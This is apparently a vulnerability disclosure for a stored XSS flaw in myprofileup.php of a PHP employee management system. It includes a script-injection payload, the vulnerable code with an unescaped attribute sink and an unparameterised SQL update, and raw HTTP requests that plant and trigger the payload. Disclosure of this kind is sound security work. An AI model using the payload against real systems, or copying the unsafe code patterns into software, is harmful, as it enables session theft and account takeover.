## EMPLOYEE_MANAGEMENT_SYSTEM file `370project/myprofileup.php` contains a Stored XSS vulnerability

Impact of the vulnerability
An attacker can inject malicious JavaScript into an employee’s profile data (e.g., `address`). When the profile update page (or any page that displays the stored value) renders this field without HTML escaping, the script may execute in the victim’s browser, leading to:

- Session hijacking (stealing cookies/tokens)
- Account takeover (actions performed as the victim)
- Phishing/UI manipulation (tampering with page content)

### Payload:

"><ScRiPt>alert(999)</sCrIpT>

```
"><ScRiPt>alert(999)</sCrIpT>
```



### POC:

The vulnerable endpoint is `POST /myprofileup.php`. The `address` value is stored to the database and later rendered into an HTML attribute without escaping:

- Database update (stores attacker input):

$result = mysqli_query($conn, "UPDATE `employee` SET `email`='$email',`contact`='$contact',`address`='$address' WHERE id=$id");

echo ("<SCRIPT LANGUAGE='JavaScript'>

​    window.alert('Succesfully Updated')

​    window.location.href='myprofile.php?id=$id  ';

​    </SCRIPT>");

- HTML sink (renders stored value into `value="..."`):

<div class="input-group">

  <p>Address</p>

​    <input class="input--style-1" type="text"  name="address" value="<?php echo $address;?>">

</div>

- Step 1: Inject payload via POST (URL-encoded):

POST /myprofileup.php HTTP/1.1

Host: 370project:82

Content-Type: application/x-www-form-urlencoded

Connection: close

email=mehadi%40xyz.corp&contact=019192&address=%22%3E%3CScRiPt%3Ealert%28999%29%3C%2FsCrIpT%3E&id=101&update=

- Step 2: Trigger execution
  Open the profile update page for the same user (or any page that displays the stored `address` field). For example:

GET /myprofileup.php?id=101 HTTP/1.1

Host: 370project:82

Accept: text/html

Connection: close

Expected result:
After the POST, revisiting the page renders the stored `address` value into the input `value` attribute and the browser executes the injected script (e.g., a popup `alert(999)`), confirming stored XSS.

### Sources download:

https://code-projects.org/employee-management-system-in-php-with-source-code/

```
https://code-projects.org/employee-management-system-in-php-with-source-code/
```



![image-20260409152900978](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260409152900978.png)